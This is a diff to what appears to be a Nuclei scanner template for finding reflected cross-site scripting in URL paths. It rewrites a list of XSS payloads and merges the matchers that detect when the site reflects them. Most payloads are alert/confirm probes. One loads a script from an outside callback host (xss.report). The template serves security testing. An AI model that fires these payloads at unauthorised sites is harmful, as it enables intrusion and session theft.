@@ -1,7 +1,7 @@
-id: PARAM-PATH-XSS
+id: PATH-XSS
 
 info:
-  name: Reflected Cross-Site Scripting (XSS)
+  name: Reflected Cross-Site Scripting (XSS) (path)
   author: 25
   severity: high
 
@@ -13,11 +13,11 @@ requests:
     payloads:
       payload: 
         - '''>"></title></style></textarea></script><script src=https://xss.report/c/babutesting></script>'
-        - '"><script>confirm(25)</script>'
-        - '%22%3E%3Cimg%20src%3Dx%20onerror%3Dconfirm(25)%3E'
-        - '"><svg/onload=confirm(25)>'
-        - '"><body/onload=alert(25)>'
-        - '"><iframe src=javascript:alert(25)>'
+        - '''"><script>confirm(25)</script>'
+        - '''"><img src=x onerror=confirm(25)>'
+        - '''"><svg/onload=confirm(25)>'
+        - '''"><body/onload=alert(25)>'
+        - '''"><iframe src=javascript:alert(25)>'
 
     stop-at-first-match: true
     matchers-condition: or
@@ -26,23 +26,7 @@ requests:
         part: body
         words:
           - "<script>confirm(25)</script>"
-
-      - type: word
-        part: body
-        words:
           - "<img src=x onerror=confirm(25)>"
-
-      - type: word
-        part: body
-        words:
           - '<svg/onload=confirm(25)>'
-
-      - type: word
-        part: body
-        words:
           - '<body/onload=alert(25)>'
-
-      - type: word
-        part: body
-        words:
           - '<iframe src=javascript:alert(25)>'
